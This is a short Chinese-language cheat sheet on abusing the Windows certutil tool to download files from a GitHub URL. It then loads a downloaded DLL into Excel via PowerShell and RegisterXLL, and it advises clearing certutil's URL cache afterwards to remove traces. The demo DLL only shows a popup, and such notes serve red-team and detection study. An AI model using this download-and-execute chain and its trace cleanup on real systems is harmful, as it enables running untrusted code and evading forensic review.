## certutil简介

[certutil简介](https://www.cnblogs.com/lfoder/p/8241548.html)

支持环境: XP  -  Windows 10 全系统

```certutil /?```  # 帮助


下载文件： 

```certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt```

**清缓存** ```certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt delete```

**使用后需要注意清除缓存**

测试系统安装Office软件，下载执行dll对应的powershell代码如下：


     ```certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll```
     
PS   ```$path="C:\Users\Administrator\msg.dll"```

PS   ```$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))```

PS   ```$excel.RegisterXLL($path)```

excel 弹出 ```hello world,I'm 3kb```

**使用后需要注意清除缓存**

查看利用certUtil下载文件的缓存记录：

certutil.exe -urlcache *

缓存文件位置：

%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
